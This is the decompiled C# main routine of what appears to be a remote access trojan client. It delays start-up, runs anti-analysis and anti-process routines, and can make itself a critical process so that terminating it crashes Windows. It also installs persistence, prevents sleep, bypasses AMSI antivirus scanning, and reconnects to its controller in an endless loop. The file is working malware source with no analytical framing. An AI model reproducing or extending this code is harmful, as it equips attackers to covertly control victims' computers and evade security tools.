using System;
using System.Threading;
using Client.Connection;
using Client.Helper;
using Client.Install;

namespace Client
{
	// Token: 0x02000002 RID: 2
	public class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x000026FC File Offset: 0x000008FC
		public static void Main()
		{
			for (int i = 0; i < Convert.ToInt32(Settings.De_lay); i++)
			{
				Thread.Sleep(1000);
			}
			if (!Settings.InitializeSettings())
			{
				Environment.Exit(0);
			}
			try
			{
				if (Convert.ToBoolean(Settings.An_ti))
				{
					Anti_Analysis.RunAntiAnalysis();
				}
				if (!MutexControl.CreateMutex())
				{
					Environment.Exit(0);
				}
				if (Convert.ToBoolean(Settings.Anti_Process))
				{
					AntiProcess.StartBlock();
				}
				if (Convert.ToBoolean(Settings.BS_OD) && Methods.IsAdmin())
				{
					ProcessCritical.Set();
				}
				if (Convert.ToBoolean(Settings.In_stall))
				{
					NormalStartup.Install();
				}
				Methods.PreventSleep();
				if (Methods.IsAdmin())
				{
					Methods.ClearSetting();
				}
				Amsi.Bypass();
			}
			catch
			{
			}
			for (;;)
			{
				try
				{
					if (!ClientSocket.IsConnected)
					{
						ClientSocket.Reconnect();
						ClientSocket.InitializeClient();
					}
				}
				catch
				{
				}
				Thread.Sleep(5000);
			}
		}
	}
}
